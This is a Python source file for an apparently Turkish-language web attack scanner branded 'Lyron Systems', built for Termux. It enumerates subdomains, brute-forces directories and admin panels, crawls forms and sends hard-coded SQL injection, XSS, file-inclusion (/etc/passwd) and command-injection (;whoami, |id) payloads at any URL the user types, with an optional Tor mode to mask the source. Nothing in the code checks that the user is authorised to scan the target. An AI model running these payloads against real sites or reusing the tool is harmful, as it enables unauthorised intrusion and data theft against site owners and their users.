#!/usr/bin/env python3
"""
Lyron Systems - Termux Web Vulnerability Scanner v2
+ Directory Brute Force
+ Subdomain Enumeration
+ Admin Panel Finder
2025
"""
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import time
import random
import os
from colorama import init, Fore, Style
from datetime import datetime

init(autoreset=True)

# Renkler ve genişlik
E = Fore.RESET
C = Fore.CYAN
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
P = Fore.MAGENTA + Style.BRIGHT
try:
    width = os.get_terminal_size().columns
except:
    width = 80

# Payloads
SQLI = ["' OR '1'='1'--", "admin'--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"]
XSS = ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>", "javascript:alert(1)"]
LFI = ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/proc/self/environ"]
CMD = [";whoami", "|id", "&&ls", "`id`"]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/129.0 Safari/537.36",
    "Mozilla/5.0 (Android 13; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0"
]

all_findings = []

def animated_banner():
    os.system('clear')
    lyron = [
        "██╗     ██╗   ██╗██████╗  ██████╗ ███╗   ██╗",
        "██║     ╚██╗ ██╔╝██╔══██╗██╔═══██╗████╗  ██║",
        "██║      ╚████╔╝ ██████╔╝██║   ██║██╔██╗ ██║",
        "██║       ╚██╔╝  ██╔══██╗██║   ██║██║╚██╗██║",
        "███████╗   ██║   ██║  ██║╚██████╔╝██║ ╚████║",
        "╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝",
    ]
    systems = [
        "███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗███████╗",
        "██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║██╔════╝",
        "███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║███████╗",
        "╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║╚════██║",
        "███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║███████║",
        "╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚══════╝"
    ]
    footer = [
        "",
        " We Code The Shadows",
        "",
        "GitHub : https://github.com/Lyron-Systems",
        " Instagram : https://instagram.com/lyronnn_",
        "",
        " Powered by Blood, Coffee & Zero Days"
    ]
   
    print(f"{P}")
    for line in lyron:
        print(line.center(width))
        time.sleep(0.06)
   
    print(f"{C}")
    time.sleep(0.3)
   
    for line in systems:
        print(line.center(width))
        time.sleep(0.06)
   
    print(f"{G}")
    for line in footer:
        print(line.center(width))
        time.sleep(0.15)
   
    print(f"{C}{"═" * width}{E}")
    time.sleep(1)

def get_session(tor=False):
    s = requests.Session()
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    if tor:
        s.proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
        print(R + "[!] Tor aktif (tor servisi çalışıyor mu kontrol et)" + E)
    return s

# Directory Brute Force
dirs = ["admin", "login", "wp-admin", "phpmyadmin", "config", "backup", "test", "dev", "api", "uploads", ".git", "robots.txt", "sitemap.xml", "admin.php", "login.php", "panel", "dashboard", "cpanel"]

def dir_brute(target):
    print(Y + "[*] Directory brute force başlıyor..." + E)
    found = []
    session = get_session()
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = {executor.submit(session.head, urljoin(target, d), allow_redirects=True, timeout=8): d for d in dirs}
        for future in as_completed(futures):
            d = futures[future]
            try:
                r = future.result()
                if r.status_code in [200, 301, 302, 403]:
                    path = urljoin(target, d)
                    found.append((path, r.status_code))
                    print(G + f"[+] {path} [{r.status_code}]" + E)
            except:
                pass
    return found

# Subdomain Enumeration
subdomains = ["www", "admin", "dev", "test", "api", "staging", "mail", "ftp", "vpn", "beta", "blog", "shop", "webmail", "panel"]

def subdomain_enum(domain):
    print(Y + "[*] Subdomain tarama..." + E)
    found = []
    for sub in subdomains:
        for proto in ["http", "https"]:
            url = f"{proto}://{sub}.{domain}"
            try:
                r = requests.head(url, timeout=6)
                if r.status_code < 400:
                    found.append(url)
                    print(G + f"[+] {url}" + E)
            except:
                pass
    return found

# Admin Panel Finder
admin_paths = ["admin/", "administrator/", "login/", "cpanel/", "wp-login.php", "admin.php", "login.php", "admin/login.php", "panel/", "controlpanel/", "dashboard/"]

def admin_finder(target):
    print(Y + "[*] Admin panel tarama..." + E)
    found = []
    session = get_session()
    for path in admin_paths:
        url = urljoin(target, path)
        try:
            r = session.head(url, timeout=8)
            if r.status_code in [200, 301, 302]:
                found.append(url)
                print(G + f"[+] Admin panel? → {url}" + E)
        except:
            pass
    return found

# Crawl Fonksiyonu (eksik olan buydu!)
def crawl(target, max_pages=35, tor=False):
    session = get_session(tor)
    visited = set()
    queue = [target]
    forms = []
   
    print(C + f"[+] Crawling başlatılıyor... (max {max_pages} sayfa)" + E)
   
    with tqdm(total=max_pages, desc="Sayfalar", colour="cyan") as pbar:
        while queue and len(visited) < max_pages:
            url = queue.pop(0)
            if url in visited:
                continue
            visited.add(url)
            pbar.update(1)
           
            try:
                r = session.get(url, timeout=12)
                if r.status_code != 200:
                    continue
               
                soup = BeautifulSoup(r.text, "html.parser")
               
                for form in soup.find_all("form"):
                    action = urljoin(url, form.get("action") or "")
                    method = form.get("method", "get").upper()
                    inputs = [i.get("name") for i in form.find_all("input") if i.get("name")]
                    if inputs and urlparse(target).netloc == urlparse(action).netloc:
                        forms.append((action, method, inputs))
               
                for a in soup.find_all("a", href=True):
                    link = urljoin(url, a["href"])
                    if urlparse(target).netloc == urlparse(link).netloc and link not in visited:
                        queue.append(link)
                       
            except Exception:
                continue
   
    print(G + f"[+] Crawl tamam: {len(visited)} sayfa, {len(forms)} form bulundu." + E)
    return forms

# Form Test (önceki kodundan aynı)
def test_form(form_info):
    url, method, params = form_info
    findings = []
    payloads = {"SQLi": SQLI, "XSS": XSS, "LFI": LFI, "Command Injection": CMD}
   
    for vtype, plist in payloads.items():
        for payload in plist:
            try:
                data = {p: payload for p in params}
                if method == "POST":
                    r = requests.post(url, data=data, timeout=10)
                else:
                    r = requests.get(url, params=data, timeout=10)
               
                text = r.text.lower()
               
                if vtype == "SQLi" and any(k in text for k in ["syntax error", "mysql", "sql", "warning", "odbc"]):
                    findings.append((vtype, url, payload, "SQL hata mesajı"))
                    break
                elif vtype == "XSS" and any(p.lower().replace("<", "").replace(">", "") in text for p in [payload]):
                    findings.append((vtype, url, payload, "Payload reflect"))
                    break
                elif vtype == "LFI" and ("root:" in r.text or "[extensions]" in r.text):
                    findings.append((vtype, url, payload, "Dosya içeriği sızdı"))
                    break
                elif vtype == "Command Injection" and any(k in text for k in ["uid=", "gid=", "root", "bin/sh"]):
                    findings.append((vtype, url, payload, "Komut çıktısı"))
                    break
            except:
                pass
            time.sleep(random.uniform(0.2, 0.5))
    return findings

# HTML Rapor (önceki kodundan aynı)
def generate_html_report(target):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M")
    filename = f"lyron_report_{int(time.time())}.html"
   
    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Lyron Scanner - {target}</title>
<style>
  body {{font-family: monospace; background:#000; color:#0f0; padding:20px;}}
  h1 {{color:#f0f; text-align:center;}}
  table {{width:100%; border-collapse:collapse; margin-top:20px;}}
  th, td {{border:1px solid #0f0; padding:12px; text-align:left;}}
  th {{background:#003300; color:#0f0;}}
  .critical {{background:#500050; color:#fff; font-weight:bold;}}
  footer {{margin-top:60px; color:#666; font-size:12px; text-align:center;}}
</style></head>
<body>
<h1>LYRON SYSTEMS - SCAN REPORT</h1>
<p><b>Target:</b> {target}<br><b>Zaman:</b> {timestamp}<br><b>Bulunan Zafiyet:</b> {len(all_findings)}</p>
<h2>Zafiyetler</h2>
{"<p style='color:#0f0; font-size:18px;'>Hiç zafiyet bulunamadı.</p>" if not all_findings else
"<table><tr><th>Tür</th><th>URL</th><th>Payload</th><th>Kanıt</th></tr>" +
"".join(f"<tr><td class='critical'>{t}</td><td><a href='{u}' style='color:#0ff'>{u}</a></td><td><code>{p}</code></td><td>{e}</td></tr>" for t,u,p,e in all_findings) +
"</table>"}
<footer>
  We Code The Shadows<br>
  Powered by Blood, Coffee & Zero Days<br>
  © Lyron Systems 2025
</footer>
</body></html>"""
   
    with open(filename, "w", encoding="utf-8") as f:
        f.write(html)
   
    print(P + f"[+] Rapor hazır: {filename}" + E)
    print(C + f" termux-open {filename} → Tarayıcıda aç" + E)

# Menu
def menu():
    while True:
        animated_banner()
       
        print(Y + "╔" + "═"*58 + "╗")
        print("║" + " LYRON WEB SCANNER v2 ".center(58) + "║")
        print("╚" + "═"*58 + "╝" + E)
        print()
        print(C + " 1 → Hızlı Test (testphp.vulnweb.com)")
        print(" 2 → Özel Target Tarama")
        print(" 3 → Tor ile Tarama")
        print(" 0 → Çıkış" + E)
       
        choice = input(G + "\n Seçimin → " + E).strip()
       
        global all_findings
        all_findings = []
        tor_mode = False
       
        if choice == "1":
            target = "http://testphp.vulnweb.com"
        elif choice == "2":
            target = input(G + " Target URL → " + E).strip()
            if not target.startswith(("http://", "https://")):
                target = "http://" + target
        elif choice == "3":
            tor_mode = True
            target = input(G + " Target URL → " + E).strip()
            if not target.startswith(("http://", "https://")):
                target = "http://" + target
        elif choice == "0":
            animated_banner()
            print(R + " Görüşürüz kardeşim. Karanlıkta kal... 🤘" + E)
            time.sleep(2)
            os.system('clear')
            break
        else:
            print(R + " Yanlış seçim la!" + E)
            time.sleep(1)
            continue
       
        domain = urlparse(target).netloc
        print()
        subdomain_enum(domain)
        dir_brute(target)
        admin_finder(target)
       
        forms = crawl(target, 35, tor_mode)
        
        if not forms:
            print(R + " Hiç form bulunamadı." + E)
        else:
            print(Y + f" [*] {len(forms)} form test ediliyor..." + E)
            with ThreadPoolExecutor(max_workers=12) as executor:
                futures = [executor.submit(test_form, f) for f in forms]
                for future in tqdm(as_completed(futures), total=len(futures), desc="Test", colour="magenta"):
                    result = future.result()
                    if result:
                        all_findings.extend(result)
                        for v in result:
                            print(R + f" [!] {v[0]} → {v[1]} → {v[2]}" + E)
       
        generate_html_report(target)
        input(C + "\n Menüye dönmek için Enter..." + E)

if __name__ == "__main__":
    menu()